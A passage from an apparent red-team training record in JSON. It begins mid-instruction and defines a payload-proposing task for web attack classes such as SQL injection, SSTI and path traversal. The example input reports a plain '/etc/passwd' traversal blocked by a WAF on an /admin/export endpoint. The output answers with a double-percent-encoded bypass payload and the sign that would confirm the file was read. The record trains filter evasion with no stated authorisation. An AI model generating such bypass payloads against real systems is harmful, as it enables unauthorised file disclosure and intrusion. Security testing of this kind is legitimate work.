OM XSS, SQLi\n  (error/boolean/time/union), SSTI, command injection, path traversal, SSRF,\n  open redirect, header injection, deserialization.\n\n## Output\n\nReturn a single JSON object:\n\n```\n{\n  \"payloads\": [\n    {\n      \"payload\": \"string, ready to inject into the parameter\",\n      \"rationale\": \"which hypothesis this tests and why it is next\",\n      \"confirm_signal\": \"the observation that would confirm execution\",\n      \"score\": 0.0-1.0\n    }\n  ]\n}\n```\n\nBest payload first. No prose outside the JSON object.", "input": "Target: /admin/export  param=ref\nSuspected class: pathtraver\nLast payload: '/etc/passwd'\n  -> scanner_decision=False context=waf_block_page (WAF/filter rejected the plain payload; response was a generic 403/406 block page, not application logic)\nPropose the single most informative next payload and the signal that would confirm the vulnerability.", "output": "{\"payloads\": [{\"payload\": \"%252Fetc%252Fpasswd\", \"rationale\": \"The plain form was blocked by a signature-based filter; re-encoding it with nested (double) percent-encoding preserves the payload's semantics for the target interpreter while no longer matching the filter's literal pattern.\", \"confirm_signal\": \"leaked file contents (/etc/passwd, win.ini) in the body\", \"score\": 0.7}]}", "meta": {"label": "pathtraver", "endpoint": "/admin/export", "param": "ref", "technique": "nested (double) percent-encoding", "redteam_seed": true}}
